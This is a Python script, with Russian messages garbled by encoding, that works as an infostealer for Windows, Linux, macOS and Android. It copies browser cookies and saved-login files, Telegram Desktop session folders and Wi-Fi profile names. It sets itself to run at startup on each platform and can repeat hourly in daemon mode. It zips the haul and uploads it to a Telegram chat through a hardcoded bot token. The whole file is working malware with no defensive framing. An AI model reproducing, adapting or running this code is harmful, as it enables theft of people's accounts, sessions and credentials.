# -------------------------
# --- created by KALI ---
# -------------------------

import datetime
import platform
import shutil
import os
import socket
import tempfile
import requests
import json
import subprocess
import sys
import time
from zipfile import ZipFile
import telebot

TOKEN = "8343681510:AAE31p5brPooeuYomXvYIj4QVMo5Ppb4fWs"
ID = "-4797934700"

bot = telebot.TeleBot(token=TOKEN)

# –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø —Å–∏—Å—Ç–µ–º—ã
def get_system_type():
    system = platform.system().lower()
    if system == "windows":
        return "windows"
    elif system == "linux":
        try:
            with open('/system/build.prop', 'r') as f:
                return "android"
        except:
            return "linux"
    elif system == "darwin":
        return "macos"
    else:
        return "unknown"

SYSTEM_TYPE = get_system_type()

def get_ip():
    try:
        response = requests.get('https://api.ipify.org/', timeout=10)
        return response.text
    except:
        try:
            response = requests.get('https://ident.me/', timeout=5)
            return response.text
        except:
            return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP"

def get_username():
    try:
        if SYSTEM_TYPE == "windows":
            return os.getlogin()
        else:
            return os.environ.get('USER', os.environ.get('USERNAME', 'Unknown'))
    except:
        return "Unknown"

def send_startup_notification():
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ —Å IP –∞–¥—Ä–µ—Å–æ–º"""
    try:
        user_name = get_username()
        ip_address = get_ip()
        os_info = platform.platform()
        
        message_text = (
            f"üöÄ –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω –Ω–∞ {SYSTEM_TYPE.upper()}!\n"
            "‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user_name}\n"
            f"üåê IP –∞–¥—Ä–µ—Å: {ip_address}\n"
            f"üíª –°–∏—Å—Ç–µ–º–∞: {os_info}\n"
            f"üïê –í—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: {datetime.datetime.now().strftime('%H:%M:%S')}\n"
            "‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî\n"
            "‚è≥ –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö..."
        )
        
        bot.send_message(chat_id=ID, text=message_text, parse_mode=None)
        print("‚úÖ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ")
        return True
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è: {e}")
        return False

def get_system_info():
    try:
        info = {
            'system_type': SYSTEM_TYPE,
            'computer_name': platform.node(),
            'processor': platform.processor(),
            'architecture': platform.architecture()[0],
            'os_version': platform.version(),
            'python_version': platform.python_version(),
            'platform': platform.platform()
        }
        return info
    except:
        return {}

def copy_file(src_path, dst_path):
    if os.path.exists(src_path):
        try:
            os.makedirs(os.path.dirname(dst_path), exist_ok=True)
            if os.path.isdir(src_path):
                shutil.copytree(src_path, dst_path, dirs_exist_ok=True)
            else:
                shutil.copy2(src_path, dst_path)
            return True
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è {src_path}: {e}")
            return False
    return False

def find_files_by_keywords(base_path, keywords, max_depth=3):
    """–ò—â–µ—Ç —Ñ–∞–π–ª—ã –ø–æ –∫–ª—é—á–µ–≤—ã–º —Å–ª–æ–≤–∞–º –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏"""
    found_files = []
    try:
        for root, dirs, files in os.walk(base_path):
            # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –≥–ª—É–±–∏–Ω—É –ø–æ–∏—Å–∫–∞
            current_depth = root[len(base_path):].count(os.sep)
            if current_depth > max_depth:
                continue
                
            for file in files:
                file_lower = file.lower()
                if any(keyword.lower() in file_lower for keyword in keywords):
                    found_files.append(os.path.join(root, file))
            
            for dir in dirs:
                dir_lower = dir.lower()
                if any(keyword.lower() in dir_lower for keyword in keywords):
                    found_files.append(os.path.join(root, dir))
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–∏—Å–∫–∞ –≤ {base_path}: {e}")
    
    return found_files

def get_browser_paths():
    """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ø—É—Ç–∏ –∫ –±—Ä–∞—É–∑–µ—Ä–∞–º —Å –ø–æ–∏—Å–∫–æ–º –ø–æ –∫–ª—é—á–µ–≤—ã–º —Å–ª–æ–≤–∞–º"""
    browsers = {}
    
    if SYSTEM_TYPE == "windows":
        username = get_username()
        browsers = {
            'Chrome': {
                'path': f'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome',
                'keywords': ['chrome', 'google', 'user data', 'default', 'cookies', 'login data']
            },
            'Firefox': {
                'path': f'C:\\Users\\{username}\\AppData\\Roaming\\Mozilla',
                'keywords': ['firefox', 'mozilla', 'profiles', 'cookies.sqlite', 'logins.json']
            },
            'Edge': {
                'path': f'C:\\Users\\{username}\\AppData\\Local\\Microsoft',
                'keywords': ['edge', 'microsoft', 'user data', 'default', 'cookies']
            },
            'Opera': {
                'path': f'C:\\Users\\{username}\\AppData\\Roaming\\Opera Software',
                'keywords': ['opera', 'stable', 'cookies', 'login data']
            },
            'Yandex': {
                'path': f'C:\\Users\\{username}\\AppData\\Local\\Yandex',
                'keywords': ['yandex', 'browser', 'user data', 'default']
            }
        }
    else:  # Linux, Android, macOS
        home_dir = os.path.expanduser("~")
        browsers = {
            'Chrome': {
                'path': home_dir,
                'keywords': ['chrome', 'google-chrome', 'config', '.config', 'cookies', 'login data']
            },
            'Firefox': {
                'path': home_dir,
                'keywords': ['firefox', 'mozilla', '.mozilla', 'profiles', 'cookies.sqlite']
            },
            'Chromium': {
                'path': home_dir,
                'keywords': ['chromium', '.config', 'chromium', 'default', 'cookies']
            },
            'Brave': {
                'path': home_dir,
                'keywords': ['brave', 'brave-browser', '.config', 'cookies', 'user data']
            },
            'Opera': {
                'path': home_dir,
                'keywords': ['opera', '.config', 'opera', 'cookies', 'login data']
            }
        }
    
    return browsers

def copy_browsers_data(report_dir):
    """–ö–æ–ø–∏—Ä—É–µ—Ç –¥–∞–Ω–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä–æ–≤ —Å –ø–æ–∏—Å–∫–æ–º –ø–æ –∫–ª—é—á–µ–≤—ã–º —Å–ª–æ–≤–∞–º"""
    browsers_data = {}
    browsers = get_browser_paths()
    
    for browser_name, browser_info in browsers.items():
        base_path = browser_info['path']
        keywords = browser_info['keywords']
        
        if os.path.exists(base_path):
            print(f"üîç –ü–æ–∏—Å–∫ {browser_name} –≤ {base_path}...")
            found_items = find_files_by_keywords(base_path, keywords)
            
            if found_items:
                browser_dir = os.path.join(report_dir, "Browsers", browser_name)
                os.makedirs(browser_dir, exist_ok=True)
                
                copied_files = []
                for item_path in found_items:
                    try:
                        item_name = os.path.basename(item_path)
                        dst_path = os.path.join(browser_dir, item_name)
                        
                        if copy_file(item_path, dst_path):
                            copied_files.append(item_name)
                            print(f"   ‚úÖ –ù–∞–π–¥–µ–Ω: {item_name}")
                    except Exception as e:
                        print(f"   ‚ùå –û—à–∏–±–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è {item_path}: {e}")
                
                if copied_files:
                    browsers_data[browser_name] = copied_files
                    print(f"‚úÖ {browser_name}: —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–æ {len(copied_files)} —Ñ–∞–π–ª–æ–≤")
                else:
                    print(f"‚ö†Ô∏è  {browser_name}: —Ñ–∞–π–ª—ã –Ω–µ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã")
            else:
                print(f"‚ùå {browser_name}: —Ñ–∞–π–ª—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –ø–æ –∫–ª—é—á–µ–≤—ã–º —Å–ª–æ–≤–∞–º")
        else:
            print(f"‚ùå {browser_name}: –±–∞–∑–æ–≤—ã–π –ø—É—Ç—å –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç - {base_path}")
    
    return browsers_data

def get_telegram_paths():
    """–ü—É—Ç–∏ –∫ Telegram —Å –ø–æ–∏—Å–∫–æ–º –ø–æ –∫–ª—é—á–µ–≤—ã–º —Å–ª–æ–≤–∞–º"""
    paths = []
    
    if SYSTEM_TYPE == "windows":
        username = get_username()
        paths = [
            f'C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop',
            f'C:\\Users\\{username}\\Documents\\Telegram Desktop'
        ]
    else:
        home_dir = os.path.expanduser("~")
        paths = [
            home_dir,
            '/usr/share',
            '/opt',
            '/var/lib'
        ]
    
    return paths

def copy_telegram_sessions(report_dir):
    """–ö–æ–ø–∏—Ä—É–µ—Ç —Å–µ—Å—Å–∏–∏ Telegram —Å –ø–æ–∏—Å–∫–æ–º –ø–æ –∫–ª—é—á–µ–≤—ã–º —Å–ª–æ–≤–∞–º"""
    sessions_found = []
    telegram_paths = get_telegram_paths()
    telegram_keywords = ['telegram', 'tdata', 'tg', 'telegramdesktop', 'D877F783D5D3EF8C']
    
    for base_path in telegram_paths:
        if os.path.exists(base_path):
            print(f"üîç –ü–æ–∏—Å–∫ Telegram –≤ {base_path}...")
            found_items = find_files_by_keywords(base_path, telegram_keywords, max_depth=4)
            
            for item_path in found_items:
                try:
                    item_name = os.path.basename(item_path)
                    dst_path = os.path.join(report_dir, "Telegram", item_name)
                    
                    if copy_file(item_path, dst_path):
                        sessions_found.append(item_path)
                        print(f"   ‚úÖ –ù–∞–π–¥–µ–Ω–∞ —Å–µ—Å—Å–∏—è: {item_name}")
                except Exception as e:
                    print(f"   ‚ùå –û—à–∏–±–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è Telegram: {e}")
    
    return sessions_found

def setup_autostart():
    """–ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É —Å–∫—Ä–∏–ø—Ç–∞"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        
        if SYSTEM_TYPE == "windows":
            # –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ –≤ Windows
            startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            bat_path = os.path.join(startup_dir, 'system_report.bat')
            
            bat_content = f'''
@echo off
python "{script_path}"
exit
'''
            with open(bat_path, 'w') as f:
                f.write(bat_content)
            print(f"‚úÖ –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ Windows –Ω–∞—Å—Ç—Ä–æ–µ–Ω–∞: {bat_path}")
            
        elif SYSTEM_TYPE == "linux":
            # –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ –≤ Linux
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            
            desktop_path = os.path.join(autostart_dir, 'system_report.desktop')
            desktop_content = f'''
[Desktop Entry]
Type=Application
Name=System Report
Exec=python3 "{script_path}"
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
'''
            with open(desktop_path, 'w') as f:
                f.write(desktop_content)
            print(f"‚úÖ –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ Linux –Ω–∞—Å—Ç—Ä–æ–µ–Ω–∞: {desktop_path}")
            
        elif SYSTEM_TYPE == "android":
            # –î–ª—è Android –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å termux-boot
            boot_dir = "/data/data/com.termux/files/home/.termux/boot"
            os.makedirs(boot_dir, exist_ok=True)
            
            boot_script = os.path.join(boot_dir, 'system_report.sh')
            boot_content = f'''
#!/data/data/com.termux/files/usr/bin/sh
sleep 10
python "{script_path}"
'''
            with open(boot_script, 'w') as f:
                f.write(boot_content)
            os.chmod(boot_script, 0o755)
            print(f"‚úÖ –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ Android –Ω–∞—Å—Ç—Ä–æ–µ–Ω–∞: {boot_script}")
            
        return True
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏: {e}")
        return False

def get_wifi_info():
    """–ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ WiFi"""
    wifi_info = []
    
    try:
        if SYSTEM_TYPE == "windows":
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'All User Profile' in line:
                            ssid = line.split(':')[1].strip()
                            wifi_info.append({'ssid': ssid, 'password': '–¢—Ä–µ–±—É–µ—Ç –∞–¥–º–∏–Ω –ø—Ä–∞–≤'})
            except:
                wifi_info.append({'ssid': '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞', 'password': '–¢—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞'})
        
        else:
            try:
                # –ü–æ–∏—Å–∫ WiFi –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π –ø–æ –∫–ª—é—á–µ–≤—ã–º —Å–ª–æ–≤–∞–º
                search_paths = ['/etc', '/etc/NetworkManager', os.path.expanduser("~")]
                wifi_keywords = ['wifi', 'network', 'wpa', 'supplicant', 'nmconnection']
                
                for base_path in search_paths:
                    if os.path.exists(base_path):
                        found_items = find_files_by_keywords(base_path, wifi_keywords, max_depth=2)
                        for item in found_items:
                            wifi_info.append({'ssid': os.path.basename(item), 'password': '–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã–π —Ñ–∞–π–ª'})
            except:
                wifi_info.append({'ssid': '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞', 'password': '–¢—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞'})
    
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è WiFi –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: {e}")
    
    return wifi_info

def create_info_file(report_dir, browsers_data, telegram_sessions, wifi_info, system_info):
    """–°–æ–∑–¥–∞–µ—Ç —Ñ–∞–π–ª —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ —Å–∏—Å—Ç–µ–º–µ"""
    try:
        info_content = [
            "=== –°–ò–°–¢–ï–ú–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø ===",
            f"–¢–∏–ø —Å–∏—Å—Ç–µ–º—ã: {system_info.get('system_type', 'N/A').upper()}",
            f"–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {get_username()}",
            f"–ò–º—è –∫–æ–º–ø—å—é—Ç–µ—Ä–∞: {system_info.get('computer_name', 'N/A')}",
            f"–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {system_info.get('processor', 'N/A')}",
            f"–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞: {system_info.get('architecture', 'N/A')}",
            f"–í–µ—Ä—Å–∏—è –û–°: {system_info.get('os_version', 'N/A')}",
            f"Python –≤–µ—Ä—Å–∏—è: {system_info.get('python_version', 'N/A')}",
            f"–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: {system_info.get('platform', 'N/A')}",
            f"IP –∞–¥—Ä–µ—Å: {get_ip()}",
            f"–í—Ä–µ–º—è —Å–±–æ—Ä–∞: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "",
            "=== –î–ê–ù–ù–´–ï –ë–†–ê–£–ó–ï–†–û–í ==="
        ]
        
        for browser, files in browsers_data.items():
            info_content.append(f"{browser}: {len(files)} —Ñ–∞–π–ª–æ–≤")
        
        info_content.extend([
            "",
            "=== –¢–ï–õ–ï–ì–†–ê–ú –°–ï–°–°–ò–ò ===",
            f"–ù–∞–π–¥–µ–Ω–æ —Å–µ—Å—Å–∏–π: {len(telegram_sessions)}",
            ""
        ])
        
        for session in telegram_sessions[:5]:  # –ü–µ—Ä–≤—ã–µ 5 —Å–µ—Å—Å–∏–π
            info_content.append(f"–°–µ—Å—Å–∏—è: {os.path.basename(session)}")
        
        info_content.extend([
            "",
            "=== WI-FI –°–ï–¢–ò ===",
            f"–ù–∞–π–¥–µ–Ω–æ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π: {len(wifi_info)}",
            ""
        ])
        
        for wifi in wifi_info[:5]:  # –ü–µ—Ä–≤—ã–µ 5 —Å–µ—Ç–µ–π
            info_content.append(f"–°–µ—Ç—å: {wifi['ssid']}")
        
        info_file = os.path.join(report_dir, "system_info.txt")
        with open(info_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(info_content))
        
        return info_file
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–∞–π–ª–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: {e}")
        return None

def send_file(file_path: str):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ–∞–π–ª —Å –¥–∞–Ω–Ω—ã–º–∏"""
    try:
        user_name = get_username()
        ip_address = get_ip()
        system_info = get_system_info()
        
        message_text = (
            f"üì¶ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –æ—Ç—á–µ—Ç —Å {SYSTEM_TYPE.upper()}!\n"
            "‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user_name}\n"
            f"üåê IP –∞–¥—Ä–µ—Å: {ip_address}\n"
            f"üíª –°–∏—Å—Ç–µ–º–∞: {system_info.get('platform', 'N/A')}\n"
            f"üïê –í—Ä–µ–º—è: {datetime.datetime.now().strftime('%H:%M:%S')}\n"
            "‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî"
        )
        
        bot.send_message(chat_id=ID, text=message_text, parse_mode=None)
        
        with open(file_path, "rb") as file:
            bot.send_document(ID, file, caption=f"üì¶ –ê–≤—Ç–æ–æ—Ç—á–µ—Ç {SYSTEM_TYPE}: {os.path.basename(file_path)}")
            
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ: {e}")

def check_internet():
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É"""
    try:
        socket.create_connection(("api.telegram.org", 443), timeout=10)
        return True
    except:
        return False

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è"""
    if not check_internet():
        print("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É")
        return
    
    print(f"üîÑ –ó–∞–ø—É—Å–∫ –Ω–∞ —Å–∏—Å—Ç–µ–º–µ: {SYSTEM_TYPE.upper()}")
    print("üîÑ –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö...")
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ
    send_startup_notification()
    
    # –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É
    if "--no-autostart" not in sys.argv:
        setup_autostart()
    
    # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
    temp_dir = tempfile.mkdtemp()
    report_dir = os.path.join(temp_dir, "report")
    os.makedirs(report_dir, exist_ok=True)
    
    # –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ
    print("üìä –°–±–æ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...")
    system_info = get_system_info()
    
    print("üåê –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤...")
    browsers_data = copy_browsers_data(report_dir)
    
    print("üì± –ü–æ–∏—Å–∫ Telegram —Å–µ—Å—Å–∏–π...")
    telegram_sessions = copy_telegram_sessions(report_dir)
    
    print("üì∂ –°–±–æ—Ä WiFi –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...")
    wifi_info = get_wifi_info()
    
    print("üìù –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...")
    create_info_file(report_dir, browsers_data, telegram_sessions, wifi_info, system_info)
    
    # –°–æ–∑–¥–∞–µ–º –∞—Ä—Ö–∏–≤ –µ—Å–ª–∏ –µ—Å—Ç—å –¥–∞–Ω–Ω—ã–µ
    if any([browsers_data, telegram_sessions]):
        time_upload = datetime.datetime.now().strftime("%H%M%S")
        username = get_username()
        arc_name = f"AutoReport_{SYSTEM_TYPE}_{username}_{time_upload}.zip"
        
        try:
            with ZipFile(arc_name, "w") as zipfile:
                for root, dirs, files in os.walk(report_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, report_dir)
                        zipfile.write(file_path, arcname)
            
            print("üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö...")
            send_file(arc_name)
            
            # –û—á–∏—Å—Ç–∫–∞
            if os.path.exists(arc_name):
                os.remove(arc_name)
                
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∞—Ä—Ö–∏–≤–∞: {e}")
    else:
        print("‚ö†Ô∏è  –î–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
    
    # –û—á–∏—â–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É
    try:
        shutil.rmtree(temp_dir)
    except:
        pass
    
    print("‚úÖ –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ!")

if __name__ == "__main__":
    # –ï—Å–ª–∏ –ø–µ—Ä–≤—ã–π –∞—Ä–≥—É–º–µ–Ω—Ç --daemon, –∑–∞–ø—É—Å–∫–∞–µ–º –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ
    if "--daemon" in sys.argv:
        while True:
            main()
            # –ñ–¥–µ–º 1 —á–∞—Å –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–∏–º –∑–∞–ø—É—Å–∫–æ–º
            time.sleep(3600)
    else:
        main()